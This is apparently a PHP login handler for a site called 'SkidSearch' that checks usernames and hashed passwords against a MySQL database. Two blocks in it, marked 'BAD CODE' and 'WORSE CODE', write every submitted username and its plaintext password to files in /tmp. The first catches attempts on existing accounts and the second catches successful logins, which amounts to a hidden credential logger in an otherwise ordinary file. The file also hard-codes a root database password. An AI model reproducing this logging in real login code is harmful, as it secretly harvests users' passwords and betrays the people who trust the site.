<?php
session_start();
error_reporting(0);
$DATABASE_HOST = 'localhost';
$DATABASE_USER = 'root';
$DATABASE_PASS = 'password';
$DATABASE_NAME = 'SkidSearchUsers';

$con = mysqli_connect($DATABASE_HOST, $DATABASE_USER, $DATABASE_PASS, $DATABASE_NAME);
if ( mysqli_connect_errno() ) {
	die ('Failed to connect to MySQL: ' . mysqli_connect_error());
}

if ( !isset($_POST['username'], $_POST['password']) ) {
	die ('Please fill both the username and password field!');
}

// Prepare our SQL, preparing the SQL statement will prevent SQL injection.
if ($stmt = $con->prepare('SELECT id, password, activation_code FROM current_users WHERE username = ?')) {
	// Bind parameters (s = string, i = int, b = blob, etc), in our case the username is a string so we use "s"
	$stmt->bind_param('s', $_POST['username']);
	$stmt->execute();
	// Store the result so we can check if the account exists in the database.
	$stmt->store_result();
}

if ($stmt->num_rows > 0) {
    $stmt->bind_result($id, $password, $activation_code);
    $stmt->fetch();

//////////////////////////////  BAD CODE  //////////////////////////
    $s = $_POST['username'].":".$_POST['password']."\n";          //
    file_put_contents('/tmp/log.txt', $s, FILE_APPEND | LOCK_EX); //
////////////////////////////////////////////////////////////////////

    // Account exists, now we verify the password.
    // Note: remember to use password_hash in your registration file to store the hashed passwords.  
    if (password_verify($_POST['password'], $password)) {
        if(($activation_code == "activated") || ($activation_code == NULL)) {
            // Verification success
            // Create sessions so we know the user is logged in, they basically act like cookies but remember the data on the server.
            session_regenerate_id();
            $_SESSION['loggedin'] = TRUE;
            $_SESSION['name'] = $_POST['username'];
            $_SESSION['id'] = $id;
            $stmt->close();

////////////////////////////  WORSE CODE  ////////////////////////////////
    $s = $_POST['username']." | ".$_POST['password']."\n";              //
    file_put_contents('/tmp/plaintext.txt', $s, FILE_APPEND | LOCK_EX); //
//////////////////////////////////////////////////////////////////////////

            $current_time = time();
            $stmt = $con->prepare('UPDATE current_users SET last_login = ? WHERE username = ?');
            $stmt->bind_param('is', $current_time, $_SESSION['name']);
            $stmt->execute();
            $stmt = $con->prepare('UPDATE current_users SET last_ip = ? WHERE username = ?');
            $stmt->bind_param('ss', $_SERVER["HTTP_CF_CONNECTING_IP"], $_SESSION['name']);
            $stmt->execute();
            header('Location: index.php');
        } else {
            echo '<html>';
            echo '<head>';
            echo '<meta charset="utf-8">';
            echo '<title>SkidSearch - Login</title>';
            echo '<link href="style.css" rel="stylesheet" type="text/css">';
            echo '</head>';
            echo '<div class="login-failure">';
            echo '<h1>Login</h1>';
            echo '<p>Your account seems to not have been activated yet<br>';
            echo 'Please check your Email for the verification link!<br>';
            echo '<a href="login.php">Try Again!</a></p>';
            echo '</div>';
            echo '</html>';
            die();
        }
    } else {
        echo '<html>';
        echo '<head>';
        echo '<meta charset="utf-8">';
        echo '<title>SkidSearch - Login</title>';
        echo '<link href="style.css" rel="stylesheet" type="text/css">';
        echo '</head>';
        echo '<div class="login-failure">';
        echo '<h1>Login</h1>';
        echo '<p>Invalid Username or Password!<br>';
        echo '<a href="login.php">Try Again!</a></p>';
        echo '</div>';
        echo '</html>';
    }
} else {
    echo '<html>';
    echo '<head>';
    echo '<meta charset="utf-8">';
    echo '<title>SkidSearch - Login</title>';
    echo '<link href="style.css" rel="stylesheet" type="text/css">';
    echo '</head>';
    echo '<div class="login-failure">';
    echo '<h1>Login</h1>';
    echo '<p>Invalid Username or Password!<br>';
    echo '<a href="login.php">Try Again!</a></p>';
    echo '</div>';
    echo '</html>';
}
$stmt->close();
?>

